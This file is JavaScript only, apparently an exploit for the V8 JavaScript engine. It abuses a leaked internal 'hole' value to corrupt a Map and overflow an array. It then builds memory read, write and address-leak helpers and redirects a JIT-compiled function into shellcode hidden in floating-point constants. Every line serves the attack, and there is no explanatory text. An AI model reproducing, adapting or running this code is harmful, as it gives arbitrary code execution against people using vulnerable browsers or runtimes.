class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
    }
    cl(f) {
        this.f64[0] = f;
        return this.u32[0]
    }
    ch(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    itof(i) {
        this.u32[0] = i;
        return this.f32[0];
    }
    f2i(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    i2f(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
}
var h = new Helpers();
const f = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	f();f();f();f();
}
let hole = [].hole();
var m = new Map();
m.set(1, 1);
m.set(hole, 1);
m.delete(hole);
m.delete(hole);
m.delete(1);
var ca = new Array(1.1, 1.1);
var ff = [4.3];
var fo = [{}];
m.set(0x10, -1);
m.set(ca, 0xffff);
flproperties = h.ch(ca[7]);
flm = h.cl(ca[7]);
flea = h.cl(ca[8]);
fllength = h.ch(ca[8]);
oproperties = h.cl(ca[14]);
om = h.ch(ca[13]);
oea = h.ch(ca[14]);
olength = h.cl(ca[15]);
function geta( obj ) {
    let bakup1 = h.cl(ca[13]);
    fo[0] = obj;
    ca[13] = h.i2f( (BigInt(flm) << 32n) + BigInt(bakup1) );
    let res = h.cl(fo[0]);
    ca[13] = h.i2f( (BigInt(om) << 32n) + BigInt(bakup1) );
    return res;
}
function wa( addr, data ) {
    ca[8] = h.i2f( (BigInt(fllength) << 0x20n) + BigInt(addr) - 0x8n );
    ff[0] = data;
}
function ra( addr ) {
    ca[8] = h.i2f( (BigInt(fllength) << 0x20n) + BigInt(addr) - 0x8n);
    return h.f2i(ff[0]);
}
let fa  = geta(f);
let codea = ra(fa + 0x18) & 0xffffffffn;
let ea = ra(codea + 0xcn);
wa(codea+0xcn, h.i2f(ea+0x73n));
f();
